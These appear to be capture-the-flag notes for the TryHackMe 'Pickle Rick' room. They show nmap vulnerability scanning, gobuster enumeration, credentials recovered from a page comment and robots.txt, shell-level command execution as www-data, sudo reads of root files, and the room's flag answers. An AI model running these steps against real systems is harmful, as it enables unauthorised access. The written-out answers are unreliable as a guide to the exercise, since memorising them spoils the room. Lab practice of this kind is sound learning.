#TryHackMe 
# Enumeration
# Nmap
┌──(root㉿kali)-[~]
└─# nmap -Pn -script=vuln -v thm
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /login.php: Possible admin folder
|_  /robots.txt: Robots file
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
| http-sql-injection: 
|   Possible sqli for queries:
|     http://thm:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     ... ...
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
|_http-dombased-xss: Couldn't find any DOM based XSS.

## In web page source
  <!--
    Note to self, remember username!
    Username: R1ckRul3s
  -->

## gobuster
┌──(root㉿kali)-[~]
└─# gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://thm/ -x php,html,txt
	/assets               (Status: 301) [Size: 295] [--> http://thm/assets/]
	/index.html           (Status: 200) [Size: 1062]
	/login.php            (Status: 200) [Size: 882]
	/robots.txt           (Status: 200) [Size: 17]


# Find 
## In web page source
  <!--
    Note to self, remember username!
    Username: R1ckRul3s
  -->
## in robots.txt
┌──(root㉿kali)-[~]
└─# curl http://morty.thm/robots.txt    
Wubbalubbadubdub

## loginphp creds = [R1ckRul3s]:[Wubbalubbadubdub]

## in http://morty.thm/portal.php#
<!-- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== -->
base64 decode 5x = rabbit hole

# FootHold
![[Pasted image 20230425215722.png]]

[www-data@ip-10-10-75-128:/var/www/html$] ls   
	Sup3rS3cretPickl3Ingred.txt
	assets
	clue.txt
	denied.php
	index.html
	login.php
	portal.php
	robots.txt
	
[www-data@ip-10-10-75-128:/var/www/html$] cat Sup3rS3cretPickl3Ingred.txt
	mr. meeseek hair

[www-data@ip-10-10-246-26:/home/rick$] sudo cat second\ ingredients 
	1 jerry tear

[www-data@ip-10-10-246-26:/home/rick$] sudo cat /root/3rd.txt
	3rd ingredients: fleeb juice

